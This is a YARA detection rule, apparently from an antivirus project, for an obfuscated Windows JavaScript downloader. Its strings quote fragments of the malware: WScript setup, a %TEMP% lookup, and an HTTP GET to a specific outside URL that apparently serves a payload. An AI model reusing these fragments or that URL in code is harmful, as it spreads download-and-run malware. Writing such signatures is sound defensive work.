rule sig_20160428_fbcd62fda65f7d64de016bed3ec562aa {
  meta:
    description = "datamaliciousorder - file 20160428_fbcd62fda65f7d64de016bed3ec562aa.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "801ed254989c618b60a55e56a76b5a82f6375183a4289e3babba00ae66c83f66"

  strings:
    $s1  = "JelTtzLqeJzuPvjInwHre[GhbErmOifTdmElyGoeSbe](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function VdePrmXexKmpMuaHqaXlq(GemDueGxxQhcUnrIszIlv){DrhQorZspUdxEfsZhcSzx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function VdePrmXexKmpMuaHqaXlq(GemDueGxxQhcUnrIszIlv){DrhQorZspUdxEfsZhcSzx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function AgkXixPjoZyoIdmBhiOfj() {return DrhQorZspUdxEfsZhcSzx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s5  = "function LchXifGaaVmdYpiPoeWqz(OfpAxxGaeSpjJuoVddLtt, LcpWgpPqrOxwKmtVegHlw){BesBmbXqeGqjKxnZxfUdd = BesBmbXqeGqjKxnZxfUdd * 1; " ascii
    $s6  = "return OfpAxxGaeSpjJuoVddLtt - LcpWgpPqrOxwKmtVegHlw;};" fullword ascii
    $s7  = "var DrhQorZspUdxEfsZhcSzx = function EvwAedJdcLroGwlJdmEve() {return PmkOzwEkbEcpRhaYlbPnm[DgcBfmAqkAqdArxMczPdg](\"WScript\"+\"" ascii
    $s8  = "var DrhQorZspUdxEfsZhcSzx = function EvwAedJdcLroGwlJdmEve() {return PmkOzwEkbEcpRhaYlbPnm[DgcBfmAqkAqdArxMczPdg](\"WScript\"+\"" ascii
    $s9  = "var PmkOzwEkbEcpRhaYlbPnm = this[\"WScript\"];" fullword ascii
    $s10 = "function AgkXixPjoZyoIdmBhiOfj() {return DrhQorZspUdxEfsZhcSzx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "if (JelTtzLqeJzuPvjInwHre[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s12 = "function LchXifGaaVmdYpiPoeWqz(OfpAxxGaeSpjJuoVddLtt, LcpWgpPqrOxwKmtVegHlw){BesBmbXqeGqjKxnZxfUdd = BesBmbXqeGqjKxnZxfUdd * 1; " ascii
    $s13 = "function JzgOfwLybDnnZubEgoNgk(){return DueHxlVwqNvkFojRsgKyh + \"\";};" fullword ascii
    $s14 = "function QtaLyvYthBwiAepCjnZce() {return ((VnlMxjDjuDryYssEnlBsr == true) && (VnlMxjDjuDryYssEnlBsr == UblHdwRdnHxlEfpSirBtv)) ?" ascii
    $s15 = "function QtaLyvYthBwiAepCjnZce() {return ((VnlMxjDjuDryYssEnlBsr == true) && (VnlMxjDjuDryYssEnlBsr == UblHdwRdnHxlEfpSirBtv)) ?" ascii
    $s16 = "EjhBqbWmgXkaBpgXcuKmq = true;" fullword ascii
    $s17 = "UblHdwRdnHxlEfpSirBtv = true; " fullword ascii
    $s18 = "function MszOzzJjoWniZjiLwpEeg(ZnvXnkOljYcsTjaSrbZhn) {var JzlEkkPmhVbyZoaAfnCzs = (1, 2, 3, 4, 5, ZnvXnkOljYcsTjaSrbZhn); retur" ascii
    $s19 = "var SjqSldTcbHhkIvjGcqFoe = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "return LchXifGaaVmdYpiPoeWqz(1 == 1 ? GbbJmwYnnUenMfpFtwSpe : 0, 1 == 1 ? WykIedJumUwrVahLygFnm : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}